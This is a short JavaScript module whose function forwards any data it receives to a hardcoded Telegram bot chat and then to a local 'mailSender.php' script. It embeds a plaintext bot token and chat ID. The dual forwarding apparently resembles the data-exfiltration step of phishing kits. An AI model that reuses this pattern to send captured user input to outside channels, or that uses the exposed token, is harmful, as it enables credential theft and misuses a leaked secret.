const settings = {
  token: '7896953244:AAGO3GhkBigNlK4cNdlX6MNQ1Owr3JEcPCc',
}

export function sendMessage(data) {
  const options = {
    method: 'POST',
    headers: {
      accept: 'application/json',
      'User-Agent': 'Telegram Bot SDK - (https://github.com/irazasyed/telegram-bot-sdk)',
      'content-type': 'application/json'
    },
    body: JSON.stringify({
      text: data,
      parse_mode: 'html',
      disable_web_page_preview: false,
      disable_notification: false,
      reply_to_message_id: null,
      chat_id: '-4683159593'
    })
  };

  fetch(`https://api.telegram.org/bot${settings.token}/sendMessage`, options)
    .then(res => res.json())
    .then(res => {
      fetch('./mailSender.php', {
        method: 'POST',
        mode: 'no-cors',
        body: data
      }).then(res => res).catch(err => err)
    })
    .catch(err => console.error(err));
}
